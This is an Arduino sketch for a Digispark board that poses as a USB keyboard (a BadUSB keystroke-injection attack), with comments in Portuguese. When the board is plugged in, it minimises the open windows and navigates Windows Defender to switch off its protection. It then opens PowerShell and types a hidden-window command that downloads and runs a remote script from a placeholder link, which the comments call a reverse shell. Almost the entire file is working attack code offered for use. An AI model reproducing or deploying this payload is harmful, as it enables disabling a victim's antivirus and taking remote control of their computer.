#include "DigiKeyboard.h"
void setup() {
  pinMode(1, HIGH);  //LED on Model A
}

void loop() {
  //Desliga o Windows Defender
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //Abre o executar
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  //DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");  
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");  //1 TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");  //1 TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
  DigiKeyboard.delay(200);
  //Reverse shell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('yourgistlinkhere.ps1');\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  //
  digitalWrite(1, HIGH);  //turn on led when program finishes
  DigiKeyboard.delay(5000);
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*empty*/ }
}
